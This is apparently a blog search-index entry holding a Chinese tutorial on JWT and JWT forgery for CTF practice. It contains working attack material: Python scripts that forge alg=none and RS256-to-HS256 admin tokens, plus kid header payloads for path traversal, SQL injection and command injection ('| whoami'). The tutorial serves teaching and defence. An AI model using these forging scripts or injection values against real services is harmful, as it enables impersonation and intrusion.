<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JWT以及jwt伪造</title>
    <url>/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<p>  JWT是一种安全机制，在某些情况下我们可以通过伪造jwt来任意用户登录</p>
<span id="more"></span>

<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><h3 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h3><p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。<strong>JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源</strong>，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<p><strong>作用:</strong></p>
<ol>
<li><strong>授权</strong>:<em>一旦用户登录，每个后续请求将包含JWT，从而允许用户访问该令牌允许的路由、服务和资源</em>。它的开销很小并且可以在不同的域使用。如：单点登录。</li>
<li><strong>信息交换</strong>：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对），因此可确保交换双方信息的正确。由于前面是使用表头和有效负载计算的，因此还可验证内容是否被篡改。</li>
</ol>
<h3 id="传统session认证"><a href="#传统session认证" class="headerlink" title="传统session认证"></a>传统session认证</h3><h4 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h4><p><strong>http协议本身是一种无状态的协议，</strong>即使用户向服务器提供了用户名和密码来进行用户认证，在下次请求时用户也得再一次进行用户认证。<em>因为根据http协议，服务器并不能知道接收到的请求来自哪个用户</em>，所以为了让应用能识别是哪个用户发出的请求，只能在服务器存储─份用户登录的信息，<u>这份登录信息会在响应时传递给浏览器，告诉其保存为cookie以便下次请求时发送给应用。这样应用就能识别请求来自哪个用户。</u></p>
<p><a href="https://www.51cto.com/article/679219.html">cookie与session区别</a></p>
<h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ol>
<li>用户经改应用认证后，应用都要在服务端存储一份session。而session一般都是保存在内存中，随着认证用户的增多，<strong>服务端的开销会明显增大</strong>。而且用户下次的请求还必须发送到这台服务器上，这样才能拿到授权的资源。<strong>在分布式应用上相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力</strong></li>
<li>session是基于cookie来进行用户识别，cookie如果被截获，用户很容易受到<strong>CSRF（跨站伪造请求攻击)攻击</strong>。</li>
</ol>
<h3 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h3><p>基于token的鉴权机制类似于http协议也是无状态的，<strong>它不需要去保留用户的认证信息或者会话信息</strong>，这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
<p>流程上是这样的：</p>
<pre><code>用户使用用户名密码来请求服务器
服务器进行验证用户的信息
服务器通过验证发送给用户一个token
客户端存储token，并在每次请求时附送上这个token值
服务端验证token值，并返回数据
</code></pre>
<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。</p>
<h3 id="JWT认证"><a href="#JWT认证" class="headerlink" title="JWT认证"></a>JWT认证</h3><h4 id="JWT原理"><a href="#JWT原理" class="headerlink" title="JWT原理"></a>JWT原理</h4><p>服务器认证以后，申城一个JSON对象，发回给用户，类似下面这个数据结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以后，<strong>用户与服务端通信的时候，都要发回这个 JSON 对象</strong>。<em>服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</em></p>
<p>在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在<u>本地</u>（通常在本地存储中，但也可以使用Cookie），而不是在传统方法中创建会话服务器并返回一个cookie。</p>
<p><strong><u>这样服务器就不保存任何 session 数据了</u>，也就是说，服务器变成无状态了，从而比较容易实现扩展</strong>。</p>
<p>特点:</p>
<ul>
<li>三部分组成，每一部分都进行字符串的转化</li>
<li><strong>解密的时候没有使用数据库，仅仅使用的是secret进行解密（减小服务器资源压力）</strong></li>
<li>Jwt使用的secret千万不能丢失</li>
</ul>
<h4 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h4><ol>
<li><strong>前端通过WEB表单将自己的用户名和密码发送到后端的接口</strong>。改过程一般是HTTP的post请求。建议的方式是通过SSL加密的传输(https协议)，从而避免敏感信息被嗅探。</li>
<li><u>后端核对用户名和密码成功后，将用户的id等其他信息作为JWT Payload(负载)，将其与头部分别进行Base64编码拼接后签名，形成一个JWT(Token)。</u></li>
<li><em>后端将IWT字符串作为登录成功的返回结果范围给前端。前段可以将返回的结果保存在localStorage（浏览器本地缓存）或sessionStorage（session缓存）上</em>，退出登录时前端删除保存的JWT。</li>
<li>前端在每次请求时将JWT放入HTTP的Header中的<strong>Authorization</strong>位。(解决XSS和XSRF问题）<br>后端检查是否存在，如存在验证JWT的有效性。例如，检查签名是否正确﹔检查Token是否过期;检查Token的接收方是否是自己(可选）</li>
<li>验证通过后后端使用JWT中包含的用户信息进行其他逻辑操作，返回相应结果</li>
</ol>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/v2-b034c3453cd2bb7177cfdbb4366a5e73_720w-1713610643655-1.webp" alt="img"></p>
<h6 id="token验证方法："><a href="#token验证方法：" class="headerlink" title="token验证方法："></a><strong>token验证方法：</strong></h6><p>验证流程:</p>
<ul>
<li>在头部信息中声明加密算法和常量，然后把header使用json转化为字符串</li>
<li>在载荷中声明用户信息，同时还有一些其他的内容，再次使用json把在和部分进行转化，转化为字符串</li>
<li>使用在header中声明的加密算法来进行加密，把第一部分字符串和第二部分的字符串结合和每个项目随机生成的secret字符串进行加密，生成新的字符串，此字符串是独一无二的</li>
<li><strong>解密的时候，只要客户端带着jwt来发起请求，服务端就直接使用secret进行解密，解签证解出第一部分和第二部分，然后比对第二部分的信息和客户端传过来的信息是否一致。如果一致验证成功，否则验证失败。</strong></li>
</ul>
<h3 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h3><p>JWT是一个stringt字符串，一般三部分组成，中间用<code>.</code>隔开。举个例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>

<p>第一部分是头部(Header)，第二部分是有效载荷(Payload)，第三部分是签名(Signature)。</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>可以使用<a href="https://jwt.io/#encoded-jwt">在线工具</a>，进行JWT解密</p>
<h4 id="头部-Header"><a href="#头部-Header" class="headerlink" title="头部(Header)"></a>头部(Header)</h4><p>头部包含两部分信息:</p>
<ul>
<li>声明类型</li>
<li>声明加密的算法也就是签名算法。</li>
</ul>
<p>完整的头部如下JSON：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将头部进行base64加密，构成第一部分。</p>
<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></p>
<ul>
<li><p>alg属性表示token签名的算法(algorithm)，<strong>最常用的为HMAC和RSA算法</strong></p>
</li>
<li><p>typ属性表示这个token的类型（type）<strong>，JWT 令牌统一写为JWT。</strong></p>
</li>
</ul>
<p><strong><u>注意：</u>可以将JWT中的alg算法修改为none,JWT将算法设定为“None”。如果<code>alg</code>字段设为<code>None</code>，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问</strong></p>
<h4 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h4><p>包含3部分信息：</p>
<ul>
<li>标准中注册的声明</li>
<li>公共的声明</li>
<li>私有的声明</li>
</ul>
<p><strong>1.标准中注册的声明</strong></p>
<p><u>JWT规定了7个官方字段，这些是一组预定义的claims，非强制性的，供选用。</u></p>
<ul>
<li>iss(issuer): jwt签发者</li>
<li>sub(subject): jwt所面向的用户</li>
<li>aud(audience): 接收jwt的一方</li>
<li>exp(expiration time): jwt的过期时间，这个过期时间必须要大于签发时间</li>
<li>nbf(Not Before): 定义在什么时间之前，该jwt都是不可用的.</li>
<li>iat(Issued At): jwt的签发时间</li>
<li>jti(JWT ID): jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</li>
</ul>
<p><strong>2.公共的声明</strong></p>
<p>公共的声明可以随意定义。自定义claims，注意不要和JWT注册表中属性冲突，这里可以查看JWT注册表，一般添加用户的相关信息或其他业务需要的必须要信息。但不建议添加敏感信息，因为该部分在客户端可解密。</p>
<p><strong>3.私有的声明</strong></p>
<p>这些是自定义的claims，用于在同意使用这些claims的各方之间共享信息，它们既不是Registered claims，也不是Public claims。 </p>
<p>如下定义一个payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class="line">  &quot;iat&quot;: 1451888119,</span><br><span class="line">  &quot;exp&quot;: 1454516119,</span><br><span class="line">  &quot;nbf&quot;: 1451888119,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再将其进行base64加密，得到JWT第二部分:<br><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</code></p>
<p><strong>注意：JWT默认是不对Payload加密的</strong>，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分。</p>
<h4 id="签证-Signature"><a href="#签证-Signature" class="headerlink" title="签证(Signature)"></a>签证(Signature)</h4><ul>
<li>base64加密后的header</li>
<li>base64加密后的payload</li>
<li>密钥secret</li>
</ul>
<p>签名是为了防止数据篡改。</p>
<p>这个部分需要base64加密后的header和Base64加密后的payload使用<code>.</code>连接组成的自妇产，然后通过header中声明的加密方式进行加盐组合加密，然后构成了jwt的第三部分。按照下面的公式产生签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// javascript</span><br><span class="line">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证</strong>，所以，它就是你服务端的<strong>私钥</strong>，只有服务器才知道，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。</p>
<p>算出签名以后，把Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>
<h3 id="通过JWT进行认证"><a href="#通过JWT进行认证" class="headerlink" title="通过JWT进行认证"></a>通过JWT进行认证</h3><p><strong>客户端接收服务器返回的JWT，将其存储在Cookie或localStorage中</strong>。此后，<strong>客户端将在与服务器交互中都会带JWT</strong>。<em>如果将它存储在Cookie中，就可以自动发送，但是不会跨域</em>，<strong>因此一般是将它放入HTTP请求的Header Authorization字段中</strong>。<em>当跨域时，也可以将JWT被放置于POST请求的数据主体中。</em></p>
<p>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</p>
<p>一般是在请求头里加入Authorization，并加上Bearer标注：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>服务端会验证token，如果验证通过就会返回相应的资源。</p>
<h2 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h2><p>参考文章:</p>
<p><code>https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9</code></p>
<p><code>https://cloud.tencent.com/developer/article/1552824</code></p>
<p><strong>JWT的安全问题一般有以下几种:</strong></p>
<ul>
<li>修改算法为none</li>
<li>修改算法从RS256到HS256</li>
<li>密钥泄露导致信息泄露</li>
<li>爆破密钥</li>
</ul>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h5><p>这里有几种读数据的方法</p>
<p><strong>Linux</strong> <strong>base64工具（带有-d标志用于解码）：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</span><br><span class="line"> &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>浏览器JavaScript控制台：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt;&gt; <span class="title function_">atob</span>(<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;</span>)</span><br><span class="line"> <span class="string">&quot;&#123;&quot;</span>typ<span class="string">&quot;:&quot;</span><span class="variable constant_">JWT</span><span class="string">&quot;,&quot;</span>alg<span class="string">&quot;:&quot;</span><span class="title class_">HS256</span><span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Powershell:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;))</span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Pyhton:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(base64.b64decode(<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#x27;</span>))</span><br><span class="line">&#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<h5 id="将算法改为none"><a href="#将算法改为none" class="headerlink" title="将算法改为none"></a>将算法改为none</h5><p><strong>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。</strong></p>
<p>设定该功能的最初目的是为了方便调试。但是，如果<strong>在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了</strong>，<u>若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。</u>，所以，使用这个方法的前提是有这个功能。</p>
<p><strong>注意:<a href="https://jwt.io/#encoded-jwt">jwt.io</a>网站不能直接修改算法为none</strong>，会被认为是恶意行为，因此无法使用在线工具生成JWT，可以用python脚本生成:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1667822180,</span><br><span class="line">    &quot;exp&quot;: 1667829380,</span><br><span class="line">    &quot;nbf&quot;: 1667822180,</span><br><span class="line">    &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;jti&quot;: &quot;237410127e2551647730b97941cdcae5&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    &quot;&quot;, # 密钥，此处置为空</span><br><span class="line">    algorithm=&quot;none&quot;, # 加密方式</span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">//注意：使用脚本只会生成两段字符串，虽然签名字符串为空，但是那个连接的点是必要的，可以看看下面ctfhub的例子</span><br></pre></td></tr></table></figure>

<p>应该还可以使用<strong>jwt_tool工具</strong>来改</p>
<p>将生成的字符串再上传，如果页面返回有效，那么说明存在漏洞。</p>
<h5 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h5><h6 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h6><p><strong>JWT最常用的两种算法是HMAC和RSA</strong>。HMAC（对称加密算法）用同一个密钥对token进行签名和认证（加密和解密）。而RSA（非对称加密算法）需要两个密钥，<strong>加密方用私钥加密，并把公钥告诉解密方用于解密</strong>。</p>
<p>再详细一些的两种加密格式上的区别:</p>
<ul>
<li>HMAC加密(对称加密)：正如上方生成签名那里一样，所以HS256加密后的字符串格式就是前面最开始那个例子。</li>
<li>RSA加密(非对称加密)：更多的使用在签名的场景，也就是确认信息的发送者。<strong>通过私钥加密，发送到对端，对端通过公钥解密。</strong>格式主要区别在于第三部分内容有所不同，代码如下:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSASHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  </span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">...     // 此处是一个RSA密钥对的公钥</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">,</span><br><span class="line">  </span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">...     // 此处是一个RSA密钥对的私钥</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>认证服务放私钥进行签名，其他服务校验的时候，通过公钥验签。</p>
<p>参考:<code>https://www.xiaoyeshiyu.com/post/191e.html</code></p>
<p>——————</p>
<h6 id="如何利用："><a href="#如何利用：" class="headerlink" title="如何利用："></a>如何利用：</h6><p>结合两种密钥的描述，在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
<p><strong>如果使用的是RS256算法加密，此时可以将算法RS256修改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）来攻击</strong>，过程如下：</p>
<p>在同时使用者两种算法时，如果本来传给客户端的JWT加密方式为RS256，<strong>这时将算法RS256改为HS256,后端代码会使用公钥作为秘密密钥，然后使用HS2562算法验证签名</strong>。<u>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到</u>，攻击者就可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名</p>
<p><strong>防御方法</strong>就是不要同时使用两种算法</p>
<p>简单生Jwt的脚本()：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span></span><br><span class="line"><span class="string">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span></span><br><span class="line"><span class="string">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span></span><br><span class="line"><span class="string">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span></span><br><span class="line"><span class="string">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span></span><br><span class="line"><span class="string">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span></span><br><span class="line"><span class="string">pwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeHeader = <span class="built_in">str</span>(encodeHBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodePayload = <span class="built_in">str</span>(encodePBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + <span class="string">&quot;.&quot;</span> + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(<span class="built_in">bytes</span>(key, <span class="string">&quot;UTF-8&quot;</span>), token.encode(<span class="string">&quot;utf-8&quot;</span>), hashlib.sha256).digest()).decode(<span class="string">&quot;UTF-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token + <span class="string">&quot;.&quot;</span> + sig)</span><br></pre></td></tr></table></figure>

<p>利用例题参考:</p>
<p><code>https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin</code></p>
<p><code>https://eyesofgods.github.io/2019/05/22/iscc2019-web-wp/</code></p>
<h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5><p>当用户端提交请求给应用程序，服务端<strong>可能</strong>没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制。</p>
<p>比如：</p>
<p>一个很好的例子是网站上的“个人资料”页面，因为我们只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。</p>
<p>此时就可以将代表身份声明改为admin，将重新生成的Token发给服务端效验，如访问页面正常，则说明漏洞存在。</p>
<h5 id="暴力破解密钥-工具"><a href="#暴力破解密钥-工具" class="headerlink" title="暴力破解密钥(工具)"></a>暴力破解密钥(工具)</h5><p><strong>爆破前提:</strong></p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已知的token</li>
<li>签名用的密钥不复杂(弱密钥)</li>
</ul>
<p><em>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证</em>。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。</p>
<p>因此，<strong>HMAC JWT破解是离线的</strong>，通过JWT破解工具可以爆破得到密钥。</p>
<p>很多工具都可以爆破，如**<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>(使用这个工具需要有字典)或者<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>等工具都可以**。爆破出密钥后就可以直接在jwt.io在线工具伪造任意用户的token。</p>
<p><strong>但是在kali上要使用工具时要在py文件目录下使用。</strong></p>
<h5 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h5><p>假设无法暴力破解密钥，那么可能通过其他途径获取密码，如git信息泄露、目录遍历，任意文件读取、XXE漏洞等，从而伪造任意token签名。</p>
<h5 id="操纵KID"><a href="#操纵KID" class="headerlink" title="操纵KID"></a>操纵KID</h5><p>KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。</p>
<h6 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><strong>目录遍历</strong></h6><p>由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;kid&quot;</span>: <span class="string">&quot;../../public/css/main.css&quot;</span>   <span class="comment">//使用公共文件main.css验证token</span></span><br></pre></td></tr></table></figure>

<p>例如，攻击者可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。</p>
<h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h6><p><strong>KID也可以用于在数据库中检索密钥</strong>。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。</p>
<p>如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;kid&quot;</span>:<span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;</span>  <span class="comment">//使用字符串&quot;key&quot;验证token</span></span><br></pre></td></tr></table></figure>

<p>上面这个注入会导致应用程序返回字符串必然为“ key”（因为数据库中不存在名为“ aaaaaaa”的密钥）。<strong>然后使用字符串“ key”作为密钥来认证token。</strong></p>
<p><strong>类似逻辑后端为：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select * from table where kid=$kid&quot;</span><br></pre></td></tr></table></figure>

<p>如此我们就可以使用如上语句来使得查询出来的key作为密钥</p>
<p>参考<code>:https://zhuanlan.zhihu.com/p/37305980</code></p>
<p>同样在HITB 2017中也存在一道，<a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">参考</a></p>
<h6 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h6><p>有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。</p>
<p>一些函数就能给此类型攻击可乘之机，<strong>比如Ruby open（）</strong>。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;key_file&quot;</span> | whoami;</span><br></pre></td></tr></table></figure>

<p>类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似system（），exec（）的函数时，都会产生此种漏洞。</p>
<h5 id="操纵头部参数"><a href="#操纵头部参数" class="headerlink" title="操纵头部参数"></a>操纵头部参数</h5><p>参考这个板块下的第二个文章，遇到搜</p>
<h4 id="相关题目wp"><a href="#相关题目wp" class="headerlink" title="相关题目wp"></a>相关题目wp</h4><h5 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h5><h6 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h6><p>题目描述:JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}</p>
<p>————</p>
<p>打开即是一个登录页面，随便登录**(第一次登录没有token)**显示<code>where is flag</code>，抓包看看，在请求包得到一个jwt字符串，如下:</p>
